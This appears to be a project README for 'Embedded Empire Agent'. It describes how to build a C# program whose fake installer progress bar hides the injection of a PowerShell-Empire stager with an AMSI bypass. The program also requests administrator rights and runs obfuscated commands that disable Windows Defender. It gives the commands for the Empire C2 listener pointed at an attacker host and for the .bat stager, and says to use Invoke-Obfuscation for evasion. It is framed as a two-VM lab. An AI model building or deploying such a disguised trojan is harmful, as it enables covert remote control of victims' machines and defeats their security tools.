```
     ______          __             __    __         __
   / ____/___ ___  / /_  ___  ____/ /___/ /__  ____/ /
  / __/ / __ `__ \/ __ \/ _ \/ __  / __  / _ \/ __  / 
 / /___/ / / / / / /_/ /  __/ /_/ / /_/ /  __/ /_/ /  
/_____/_/ /_/ /_/_.___/\___/\__,_/\__,_/\___/\__,_/   

                     `````````
                         ````.-::///+ 
                     `-+sydmmmNNNNNNN
                   ./ymmNNNNNNNNNNNNNN
                 `-ymmNNNNNNNNNNNNNNNN 
               `ommmmNNNNNNNNNNNNNNNNN
              `.ydmNNNNNNNNNNNNNNNNNNN
             `/hmmmNNNNNNNNNNNNNNNNMNN
           ``+hmmmNNNNNNNNNNNNNNNNNMMN
          ``.:ymmmNNNNNNNNNNNNNNNNNNNN
         ```.-/osy+//::---...---:///++
        ``:sdyyydy`       `.:mNNNNNNN 
       ``.hmmdhdmm:     .+hNNNNNNNNNM
      ```/hNNmd/dNNhhdNNNNNNNNNNNNNNN
      ```-hNNNm::mNNNNNNNNNNNNNNNNNNN
     ```/hNNmmmd/+NNNNNNNNNNNNNNNNNm 
     ``/dNNNNmmm+NNNNNNNNNNNmdoosydd
     `sNNNdy+dNNmmmmNNNNNmyoymNNNNNN
      /yhmNNNNNNNNNNNNNNNNNNNNNNmhh 
       `+yhmmNNNNNNNNNNNNNNNNNNmh+. 
         `./dmmNNNNNNNNNNNNNmmd.    
           `ommmNNNNNmNmNNNmmd:     
             :dmmNNNmh./oyhhhy:     
             `/dmmmdo-:/ossd:       
               `/hmmmdddddmh/       
                 `-/shddhyo-        
                    `----.      
    ______                _              ___                    __ 
   / ____/___ ___  ____  (_)_______     /   | ____ ____  ____  / /_
  / __/ / __ `__ \/ __ \/ / ___/ _ \   / /| |/ __ `/ _ \/ __ \/ __/
 / /___/ / / / / / /_/ / / /  /  __/  / ___ / /_/ /  __/ / / / /_  
/_____/_/ /_/ /_/ .___/_/_/   \___/  /_/  |_\__, /\___/_/ /_/\__/  
               /_/                         /____/                  
```

> ⚠️ **Warning:** As of today, this may not be able to bypass AMSI anymore


## Techno & Tools

- C#
- Python
- PowerShell-Empire
- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

## Process

### Setup Environment

- You will need 2 VMs
    - Windows (Victim)
    - Kali Linux (Attacker)

### Configure C2

#### 1. Start PowerShell-Empire

<aside>
📌 Open 2  terminal and in each one enter these command (one in each)

</aside>

```bash
sudo powershell-empire server
sudo powershell-empire client
```

#### 2. Configure Listener

```bash
uselistner http
set Name <Name>
set Host <Your IP>
set Port <Port>
execute
```

#### 3. Configure Stager

<aside>
📌 This will generate .bat file

</aside>

```bash
usestager windows/laucher_bat
set listener <listener_name>
execute
```

## Coding Application

💡Make Progress Bar that will make it seem, like it is installing something but in the background it will inject the stager + AMSI Bypass (The patch is only applied for one PowerShell session after that it goes back to default)


- I added an app-manifest that requires the application to be executed as administrator, so I would already have elevated privilege
- I also added some PowerShell command to deactivate some functionalities of windows defender, to be able to execute the script (They will be obfuscated)
- Now Your question might be why you need an AMSI bypass if you will disable windows defender. The thing is when you some PowerShell command AMSI will block it’s execution because it might be a malicious command even if it is obfuscated

### Obfuscation

📌 Follow the instruction in this repository: [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) , to install Invoke-Obfuscation on you attacking machine (Do it in a new terminal)

You can encode any PowerShell command that you add in the Agent Process class

## Delivery

```bash
dotnet build
```

## Testing

- Zip the program
- Put it on the victim machine
- unzip it
- execute program
   - Will have to keep my listener running on my PowerShell machine
